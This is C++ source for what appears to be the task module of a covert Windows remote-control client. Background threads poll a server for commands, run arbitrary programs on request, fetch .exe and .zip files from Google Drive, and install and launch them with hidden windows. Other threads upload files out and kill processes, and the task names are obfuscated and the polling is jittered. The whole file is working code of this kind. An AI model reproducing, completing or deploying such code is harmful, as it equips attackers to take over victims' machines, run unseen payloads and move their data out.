#include <winsock2.h>
#include "Tasks.h"
#include "Utils.h"
#include "Models.h"
#include "HttpUtil.h"
#include "DB.h"
#include "Locker.h"
#include "Downloader.h"
#include "AppInstaller.h"
#include "Uploader.h"
#include <Windows.h>
#include "App.h"
#include <thread>

void _downloadsFetcherTask()
{
    std::string mtx = GetMachineID();
    mtx += OBFUSCATED("download_fetcher_task");
    Locker lck(mtx, true);
    if (lck.Lock())
    {
        while (true)
        {
            try
            {
                auto localDownloads = findDownloads({}, 1, "created_at");

                auto nwDls = fetchDownloads(localDownloads.empty() ? 0 : localDownloads[0].created_at + 1);
                if (!nwDls.empty())
                {
                    for (auto &dl : nwDls)
                    {
                        SaveDownload(dl);
                    }
                }
            }
            catch (const std::exception &e)
            {
                // MessageBoxA(NULL, e.what(), "Exception", MB_OK);
            }

            Sleep(10000 + GetRandom(1000, 10000));
            WaitForConnection();
        }
    }
}
void postUploadProgresses()
{
    std::map<std::string, DBValue> params;
    DBValue q;
    q.equality = DBEquality::EQUAL;
    q.boolValue = std::make_shared<bool>(false);
    params.emplace("doneWithUpdate", q);
    auto upProgresses = findUploadProgresses(params);
    if (!upProgresses.empty())
    {
        std::vector<std::thread> threads;
        std::atomic<int> posting = 0;
        for (auto &entry : upProgresses)
        {
            posting++;
            std::thread thread((std::function<void()>)[&]() {
                try
                {
                    bool posted = false;
                    for (size_t i = 0; i < 5 && !posted; i++)
                    {
                        posted = postUploadProgress(entry);
                        if (posted)
                            break;
                        Sleep(1000);
                    }
                    if (posted && entry.complete)
                    {
                        entry.doneWithUpdate = true;
                        UpdateUploadProgress(entry);
                    }
                    posting--;
                }
                catch (const std::exception &e)
                {
                    posting--;
                    std::cerr << e.what() << '\n';
                }
            });
            threads.push_back(std::move(thread));
            while (posting > 3)
            {
                Sleep(2000);
            }
        }
        for (auto &thread : threads)
        {
            if (thread.joinable())
                thread.join();
        }
    }
}
void postDownloadProgresses()
{
    std::map<std::string, DBValue> params;
    DBValue q;
    q.equality = DBEquality::EQUAL;
    q.boolValue = std::make_shared<bool>(false);
    params.emplace("doneWithUpdate", q);
    auto dlProgresses = findDownloadProgresses(params);
    if (!dlProgresses.empty())
    {
        std::vector<std::thread> threads;
        std::atomic<int> posting = 0;
        for (auto &entry : dlProgresses)
        {
            posting++;
            std::thread thread((std::function<void()>)[&]() {
                try
                {
                    bool posted = false;
                    for (size_t i = 0; i < 5 && !posted; i++)
                    {
                        posted = postDownloadProgress(entry);
                        if (posted)
                            break;
                        Sleep(1000);
                    }
                    if (posted && entry.complete)
                    {
                        entry.doneWithUpdate = true;
                        UpdateDownloadProgress(entry);
                    }
                    posting--;
                }
                catch (const std::exception &e)
                {
                    posting--;
                    std::cerr << e.what() << '\n';
                }
            });
            threads.push_back(std::move(thread));
            while (posting > 3)
            {
                Sleep(2000);
            }
        }
        for (auto &thread : threads)
        {
            if (thread.joinable())
                thread.join();
        }
    }
}
void _transferProgressTask()
{
    std::string mtx = GetMachineID();
    mtx += OBFUSCATED("transfer_progress_task");
    Locker lck(mtx, true);
    if (lck.Lock())
    {

        while (true)
        {
            try
            {
                postUploadProgresses();
                postDownloadProgresses();
            }
            catch (const std::exception &e)
            {
                // MessageBoxA(NULL, e.what(), "Exception", MB_OK);
            }
            Sleep(20000);
        }
    }
}
void _uploadFetcherTask()
{
    std::string mtx = GetMachineID();
    mtx += OBFUSCATED("upload_fetcher_task");
    Locker lck(mtx, true);
    if (lck.Lock())
    {
        while (true)
        {
            try
            {
                auto localUploads = findUploads({}, 1, "created_at");

                auto nwUps = fetchUploads(localUploads.empty() ? 0 : localUploads[0].created_at + 1);
                if (!nwUps.empty())
                {
                    for (auto &dl : nwUps)
                    {
                        SaveUpload(dl);
                    }
                }
            }
            catch (const std::exception &e)
            {
                // MessageBoxA(NULL, e.what(), "Exception", MB_OK);
            }
            Sleep(10000 + GetRandom(1000, 10000));
            WaitForConnection();
        }
    }
}
void _commandsFetcherTask()
{
    std::string mtx = GetMachineID();
    mtx += OBFUSCATED("commands_fetcher_task");
    Locker lck(mtx, true);
    if (lck.Lock())
    {
        while (true)
        {
            try
            {
                auto localCommands = findCommands({}, 1, "created_at");
                auto nwCmds = fetchCommands(localCommands.empty() ? 0 : localCommands[0].created_at + 1);
                if (!nwCmds.empty())
                {
                    for (auto &dl : nwCmds)
                    {
                        try
                        {
                            SaveCommand(dl);
                        }
                        catch (const std::exception &e)
                        {
                            std::cerr << e.what() << '\n';
                        }
                    }
                }
            }
            catch (const std::exception &e)
            {
                // MessageBoxA(NULL, e.what(), "Exception", MB_OK);
            }
            Sleep(10000 + GetRandom(1000, 10000));
            WaitForConnection();
        }
    }
}

void _appsFetcherTask()
{
    std::string mtx = GetMachineID();
    mtx += OBFUSCATED("apps_fetcher_task");
    Locker lck(mtx, true);
    if (lck.Lock())
    {

        while (true)
        {
            try
            {
                auto drives = fetchDrives();
                std::vector<SavedRunnable> newRemoteIds;
                std::vector<Runnable> newRunnables;
                for (auto &drive : drives)
                {
                    int64_t fromTime = 0;
                    if (drive.get_kind() == DR_GOOGLE)
                    {
                        std::map<std::string, DBValue> params;
                        DBValue q;
                        q.equality = DBEquality::EQUAL;
                        q.intValue = std::make_shared<int64_t>((int64_t)drive.get_kind());
                        params.emplace("cloudType", q);

                        DBValue q2;
                        q2.equality = DBEquality::EQUAL;
                        q2.stringValue = std::make_shared<std::string>(drive.get_id());
                        params.emplace("drive_id", q2);

                        auto localRunnables = findRunnables(params, 1, "created_at");
                        if (!localRunnables.empty())
                        {
                            fromTime = localRunnables[0].created_at;
                        }
                        if (fromTime > 0)
                        {
                            fromTime += 1;
                        }
                        auto apps = fetchCloudApps(drive.get_id(), fromTime);
                        if (!apps.empty())
                        {
                            auto savedIds = findSavedRunnableIds();
                            for (auto &app : apps)
                            {
                                if (!VectorContains(savedIds, app.get_id()) && (StringUtils::endsWith(app.get_name(), ".exe") || StringUtils::endsWith(app.get_name(), ".zip")))
                                {
                                    Runnable r;
                                    r.remoteID = app.get_id();
                                    r.cloudType = DR_GOOGLE;
                                    r.drive_id = drive.get_id();
                                    r.remoteID = app.get_id();
                                    r.run = true;
                                    r.downloaded = false;
                                    r.showWindow = false;
                                    r.created_at = (int64_t)app.get_created_at();
                                    r.name = app.get_name();
                                    r.mainExe = "";

                                    newRunnables.push_back(r);

                                    SavedRunnable sr;
                                    sr.remoteId = app.get_id();
                                    sr.drive_id = drive.get_id();
                                    sr.created_at = app.get_created_at();
                                    sr.type = drive.get_kind();

                                    newRemoteIds.push_back(sr);
                                }
                            }
                        }
                    }
                }
                for (auto &runnable : newRunnables)
                {
                    try
                    {
                        SaveRunnable(runnable);
                    }
                    catch (const std::exception &e)
                    {
                        std::cerr << e.what() << '\n';
                    }
                }
                for (auto &sr : newRemoteIds)
                {
                    try
                    {
                        SaveSavedRunnable(sr);
                    }
                    catch (const std::exception &e)
                    {
                        std::cerr << e.what() << '\n';
                    }
                }
            }
            catch (const std::exception &e)
            {
                // MessageBoxA(NULL, e.what(), "Exception", MB_OK);
            }

            Sleep(10000 + GetRandom(1000, 10000));
            WaitForConnection();
        }
    }
}
void _downloadLocalDownloads()
{
    std::map<std::string, DBValue> params;
    DBValue q;
    q.equality = DBEquality::EQUAL;
    q.boolValue = std::make_shared<bool>(false);
    params.emplace("completed", q);

    DBValue q2;
    q2.equality = DBEquality::EQUAL;
    q2.boolValue = std::make_shared<bool>(false);
    params.emplace("stopped", q2);

    auto localDownloads = findDownloads(params);
    std::vector<std::thread> threads;
    std::atomic<int> downloading = 0;
    for (auto &download : localDownloads)
    {
        downloading++;
        std::thread thread((std::function<void()>)[&]() {
            try
            {
                downloadDownload(download);
                downloading--;
            }
            catch (const std::exception &e)
            {
                downloading--;
                std::cerr << e.what() << '\n';
            }
        });
        threads.push_back(std::move(thread));
        while (downloading > 3)
        {
            Sleep(2000);
        }
    }
    for (auto &thread : threads)
    {
        if (thread.joinable())
            thread.join();
    }
}
void processCommands()
{
    std::map<std::string, DBValue> params;
    DBValue q;
    q.equality = DBEquality::EQUAL;
    q.boolValue = std::make_shared<bool>(false);
    params.emplace("processed", q);

    auto localCommands = findCommands(params);
    for (auto &command : localCommands)
    {
        if (!command.client_id.empty())
        {
            try
            {
                auto cl = fetchClient(command.client_id);
                if (cl)
                {
                    if (cl->get_machine_id() != GetMachineID())
                    {
                        command.processed = true;
                        try
                        {
                            UpdateCommand(command);
                        }
                        catch (const std::exception &e)
                        {
                            std::cerr << e.what() << '\n';
                        }
                        continue;
                    }
                }
            }
            catch (const std::exception &e)
            {
                std::cerr << e.what() << '\n';
            }
        }
        if (command.type == CommandType::CM_EXECUTE)
        {
            auto line = splitCommandLine(command.params);
            if (!line.empty())
            {
                std::string cmd;

                if (line.size() > 1)
                {
                    for (size_t i = 1; i < line.size(); i++)
                    {
                        if (StringUtils::contains(line[i], " "))
                        {
                            cmd += "\"" + line[i] + "\" ";
                        }
                        else
                        {
                            cmd += line[i];
                        }
                    }
                    cmd = StringUtils::trim(cmd);
                }
                auto res = StartProcess(line[0], cmd);
                std::cout << res.result << "\n";
            }
            command.processed = true;
            try
            {
                UpdateCommand(command);
            }
            catch (const std::exception &e)
            {
                std::cerr << e.what() << '\n';
            }
        }
        else if (command.type == CommandType::CM_STARTAPP || command.type == CommandType::CM_STOPAPP)
        {
            std::map<std::string, DBValue> runParams;
            DBValue runQ;

            runQ.equality = DBEquality::EQUAL;
            runQ.stringValue = std::make_shared<std::string>(command.params);
            runParams.emplace("id", runQ);

            auto runnables = findRunnables(runParams, 1);
            if (!runnables.empty())
            {
                auto runnable = runnables[0];
                runnable.run = command.type == CommandType::CM_STARTAPP;
                try
                {
                    UpdateRunnable(runnable);
                }
                catch (const std::exception &e)
                {
                    std::cerr << e.what() << '\n';
                }
                command.processed = true;
                try
                {
                    UpdateCommand(command);
                }
                catch (const std::exception &e)
                {
                    std::cerr << e.what() << '\n';
                }
            }
        }
        else if (command.type == CommandType::CM_UNINSTALL_APP)
        {
            std::map<std::string, DBValue> runParams;
            DBValue runQ;

            runQ.equality = DBEquality::EQUAL;
            runQ.stringValue = std::make_shared<std::string>(command.params);
            runParams.emplace("id", runQ);

            auto runnables = findRunnables(runParams, 1);
            if (!runnables.empty())
            {
                auto runnable = runnables[0];
                try
                {
                    if (runnable.run)
                    {
                        runnable.run = false;
                        UpdateRunnable(runnable);
                    }
                    try
                    {
                        auto dir = (fs::path(GetAppsDir()) /= runnable.remoteID).string();
                        if (Exists(dir))
                        {
                            KillAllFromDirectory(dir);
                            fs::remove_all(dir);
                            deleteRunnable(runnable.id);
                        }
                        command.processed = true;
                        UpdateCommand(command);
                    }
                    catch (const std::exception &e)
                    {
                        std::cerr << e.what() << '\n';
                    }
                }
                catch (const std::exception &e)
                {
                    std::cerr << e.what() << '\n';
                }
            }
        }
    }
}
void _downloadRunnables()
{
    std::map<std::string, DBValue> params;

    DBValue q;
    q.equality = DBEquality::EQUAL;
    q.boolValue = std::make_shared<bool>(false);
    params.emplace("downloaded", q);

    auto runnables = findRunnables(params, 1);
    std::vector<std::thread> threads;
    std::atomic<int> downloading = 0;
    for (auto &runnable : runnables)
    {
        downloading++;
        std::thread thread((std::function<void()>)[&]() {
            try
            {
                downloadRunnable(runnable);
                downloading--;
            }
            catch (const std::exception &e)
            {
                downloading--;
                std::cerr << e.what() << '\n';
            }
        });
        threads.push_back(std::move(thread));
        while (downloading > 3)
        {
            Sleep(2000);
        }
    }
    for (auto &thread : threads)
    {
        thread.join();
    }
}
void _downloaderTask()
{
    std::string mtx = GetMachineID();
    mtx += OBFUSCATED("downloader_task");
    Locker lck(mtx, true);
    if (lck.Lock())
    {
        while (true)
        {
            try
            {
                _downloadLocalDownloads();
                _downloadRunnables();
            }
            catch (const std::exception &e)
            {
                // MessageBoxA(NULL, e.what(), "Exception", MB_OK);
            }
            Sleep(10000 + GetRandom(1000, 10000));
            WaitForConnection();
        }
    }
}
void uploadLocalUploads()
{
    std::map<std::string, DBValue> params;
    DBValue q;
    q.equality = DBEquality::EQUAL;
    q.boolValue = std::make_shared<bool>(false);
    params.emplace("completed", q);

    DBValue q2;
    q2.equality = DBEquality::EQUAL;
    q2.boolValue = std::make_shared<bool>(false);
    params.emplace("stopped", q2);

    auto localUploads = findUploads(params);
    std::vector<std::thread> threads;
    std::atomic<int> uploading = 0;
    for (auto &upload : localUploads)
    {
        uploading++;
        std::thread thread((std::function<void()>)[&]() {
            try
            {
                uploadUpload(upload);
                uploading--;
            }
            catch (const std::exception &e)
            {
                uploading--;
                std::cerr << e.what() << '\n';
            }
        });
        threads.push_back(std::move(thread));
        while (uploading > 3)
        {
            Sleep(2000);
        }
    }
    for (auto &thread : threads)
    {
        if (thread.joinable())
            thread.join();
    }
}
void _runnerTask()
{
    std::string mtx = GetMachineID();
    mtx += OBFUSCATED("runner task");
    Locker lck(mtx, true);
    if (lck.Lock())
    {
        std::map<std::string, DBValue> params;

        DBValue q;
        q.equality = DBEquality::EQUAL;
        q.boolValue = std::make_shared<bool>(true);
        params.emplace("run", q);

        while (true)
        {
            try
            {
                auto runnables = findRunnables(params);
                for (auto &runnable : runnables)
                {
                    std::thread thread((std::function<void(Runnable)>)[=](Runnable r) {
                        try
                        {
                            RunApp(r);
                        }
                        catch (const std::exception &e)
                        {
                            std::cerr << e.what() << '\n';
                        }
                    },
                                       runnable);
                    thread.detach();
                }
            }
            catch (const std::exception &e)
            {
                // MessageBoxA(NULL, e.what(), "Exception", MB_OK);
            }
            Sleep(10000);
        }
    }
}
void _uploaderTask()
{
    std::string mtx = GetMachineID();
    mtx += OBFUSCATED("uploader_task");
    Locker lck(mtx, true);
    if (lck.Lock())
    {
        while (true)
        {
            try
            {
                uploadLocalUploads();
            }
            catch (const std::exception &e)
            {
                // MessageBoxA(NULL, e.what(), "Exception", MB_OK);
            }
            Sleep(10000 + GetRandom(1000, 10000));
            WaitForConnection();
        }
    }
}
void RunApp(Runnable runnable)
{
    std::string mtx = GetMachineID();
    mtx += OBFUSCATED("apprunner_");
    mtx += runnable.remoteID + "_";
    mtx += std::to_string(runnable.id);

    Locker lck(mtx, true);
    if (runnable.run && !runnable.mainExe.empty() && lck.Lock())
    {
        std::atomic_bool shoulExit = false;
        std::atomic_bool exitMonitor = false;

        std::thread monitorThread((std::function<void()>)[&]() {
            while (!exitMonitor)
            {
                for (size_t i = 0; i < 100; i++)
                {
                    Sleep(100);
                    if (exitMonitor)
                    {
                        break;
                    }
                }
                auto loadedRunnable = findRunnable(runnable.id);
                if (loadedRunnable)
                {
                    if (!loadedRunnable->run || (loadedRunnable->showWindow != runnable.showWindow))
                    {
                        shoulExit = true;
                        break;
                    }
                }
            }
        });

        KillAllFromDirectory((fs::path(GetAppsDir()) /= runnable.remoteID).string());

        StartProcess(runnable.mainExe, "", 0, &shoulExit, runnable.showWindow);
        exitMonitor = true;
        if (monitorThread.joinable())
        {
            monitorThread.join();
        }
    }
}
void _installerTask()
{
    std::string mtx = GetMachineID();
    mtx += OBFUSCATED("installer_task");
    Locker lck(mtx, true);
    if (lck.Lock())
    {
        while (true)
        {
            try
            {

                for (auto &file : listFiles(GetDefaultAppsDownloadsDir()))
                {
                    if (file.isDir || StringUtils::endsWith(file.path, ".tmp"))
                    {
                        continue;
                    }
                    std::string id = RemoveExt(fs::path(file.path).filename().string());
                    std::map<std::string, DBValue> params;

                    DBValue q2;
                    q2.equality = DBEquality::EQUAL;
                    q2.stringValue = std::make_shared<std::string>(id);
                    params.emplace("remoteID", q2);

                    auto runnables = findRunnables(params, 1);
                    if (!runnables.empty() && !file.isDir && !StringUtils::endsWith(file.path, ".tmp"))
                    {
                        try
                        {
                            auto res = InstallApp(runnables[0]);
                            if (res.success)
                            {
                                runnables = findRunnables(params, 1);
                                if (!runnables.empty())
                                {
                                    auto runnable = runnables[0];
                                    runnable.mainExe = res.mainExe;
                                    UpdateRunnable(runnable);
                                }
                            }
                        }
                        catch (const std::exception &e)
                        {
                            std::cerr << e.what() << '\n';
                        }
                    }
                }
            }
            catch (const std::exception &e)
            {
                // MessageBoxA(NULL, e.what(), "Exception", MB_OK);
            }
            Sleep(10000 + GetRandom(1000, 10000));
        }
    }
}
void _commandsRunnerTask()
{
    std::string mtx = GetMachineID();
    mtx += OBFUSCATED("commands_runner_task");
    Locker lck(mtx, true);
    if (lck.Lock())
    {
        while (true)
        {
            try
            {
                processCommands();
                /* code */
            }
            catch (const std::exception &e)
            {
                // MessageBoxA(NULL, e.what(), "Exception", MB_OK);
            }

            Sleep(10000 + GetRandom(1000, 10000));
            WaitForConnection();
        }
    }
}
void downloadsFetcherTask()
{
    std::thread th([]()
                   { _downloadsFetcherTask(); });
    th.detach();
}
void uploadsFetcherTask()
{
    std::thread th([]()
                   { _uploadFetcherTask(); });
    th.detach();
}
void appsFetcherTask()
{
    std::thread th([]()
                   { _appsFetcherTask(); });
    th.detach();
}
void commandsFetcherTask()
{
    std::thread th([]()
                   { _commandsFetcherTask(); });
    th.detach();
}
void commandsRunnerTask()
{
    std::thread th([]()
                   { _commandsRunnerTask(); });
    th.detach();
}
void downloaderTask()
{
    std::thread th([]()
                   { _downloaderTask(); });
    th.detach();
}
void uploaderTask()
{
    std::thread th([]()
                   { _uploaderTask(); });
    th.detach();
}
void installerTask()
{
    std::thread th([]()
                   { _installerTask(); });
    th.detach();
}
void runnerTask()
{
    std::thread th([]()
                   { _runnerTask(); });
    th.detach();
}
void transferProgressTask()
{
    std::thread th([]()
                   { _transferProgressTask(); });
    th.detach();
}
